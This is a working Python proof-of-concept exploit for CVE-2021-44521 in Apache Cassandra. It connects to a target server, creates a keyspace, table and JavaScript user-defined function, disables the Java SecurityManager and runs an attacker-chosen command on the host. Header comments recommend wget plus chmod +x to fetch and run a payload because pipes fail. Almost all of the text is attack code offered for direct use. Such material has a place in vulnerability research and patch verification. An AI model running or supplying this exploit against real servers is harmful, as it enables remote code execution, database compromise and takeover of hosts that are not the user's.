#CVE: CVE-2021-44521
#Author: wooden_klaas/QHpix
#Notes:
# Pipes don't work directly. So no traditional rev shell. Use wget + chmod +x instead
# Exploit must have something in a table, won't run otherwise
# Non-automated PoC: https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/


from cassandra.cluster import Cluster
from sys import argv

def help():
    print('Usage: python3 {} <ip> <cmd>'.format(argv[0]))
    exit()

def main():
    cluster = Cluster([argv[1]])
    session = cluster.connect('system')
    #Create the namespace we'll be using and set it as active
    session.execute("CREATE KEYSPACE IF NOT EXISTS exploit WITH replication = {'class':'SimpleStrategy', 'replication_factor' : 3};")
    session.set_keyspace('exploit')
    # Create the necessary things to run the exploit
    session.execute('CREATE TABLE IF NOT EXISTS exploit.poc (blah text, PRIMARY KEY (blah))')
    #check if we exploited before
    test = session.execute('SELECT blah FROM exploit.poc')
    for row in test:
        if row[0] == 'blah blah':
            break
    else:
        session.execute("INSERT INTO exploit.poc (blah) VALUES ('blah blah')")
    #Create the exploit function
    session.execute('''create or replace function exploit.escape_system(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("{}")');name $$;'''.format(argv[2]))
    #Run time!
    session.execute('SELECT exploit.escape_system(blah) FROM exploit.poc')

if __name__ == '__main__':
    if len(argv) < 3:
        help()
    main()
